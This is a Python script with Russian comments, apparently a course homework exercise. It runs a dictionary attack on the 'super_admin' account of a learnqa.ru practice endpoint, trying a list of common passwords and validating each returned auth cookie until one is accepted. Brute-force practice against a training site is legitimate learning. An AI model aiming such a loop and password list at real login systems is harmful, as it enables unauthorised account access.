import requests


passwords = ['1', 'password', '123456', '2', '123456789', '3', '12345678', '12345', 'qwerty', '4', 'abc123', '5', 'football', '1234567', '6', 'monkey', '111111', '7', 'letmein', '1234', '1234567890', '8', 'dragon', 'baseball', 'sunshine', 'iloveyou', '9', 'trustno1', 'princess', '10', 'adobe123[a]', '123123', '11', 'welcome', 'login', 'admin', '12', 'qwerty123', '13', 'solo', '1q2w3e4r', '14', 'master', '666666', '15', 'photoshop[a]', '1qaz2wsx', 'qwertyuiop', '16', 'ashley', 'mustang', '121212', 'starwars', '654321', '17', 'bailey', 'access', 'flower', '555555', '18', 'passw0rd', 'shadow', 'lovely', '19', '7777777', '20', 'michael', '!@#$%^&*', '21', 'jesus', 'password1', 'superman', 'hello', 'charlie', '888888', '22', '696969', 'hottie', 'freedom', 'aa123456', '23', 'qazwsx', 'ninja', 'azerty', 'loveme', 'whatever', 'donald', '24', 'batman', 'zaq1zaq1', '25', 'Football', '000000', '123qwe']
login = "super_admin"

for i in passwords:
    print(f"POST https://playground.learnqa.ru/ajax/api/get_secret_password_homework, password = {i}")
    payload = {"login": login, "password": i}
    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)
    #print(f"{response1}, {response1.text}")  #вывожу ответ
    cookie_value = response1.cookies.get('auth_cookie')
    #print(f"cookie_value = {cookie_value}")


    cookies = {"auth_cookie": cookie_value}  # делаем словарь для авторизованной куки, чтобы с этой кукой обратиться уже по второму запросу
    response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
    # print(f"{response2}, {response2.text}") # вывожу ответ


    if response2.text == 'You are authorized': #нашли верный пароль
        print(f"Верный пароль = {i}, {response2}, {response2.text}")
        break

    if i == passwords[len(passwords)-1]: #не нашли пароль, но список passwords закончился
        print(f"среди списка passwords пароль не найден!")


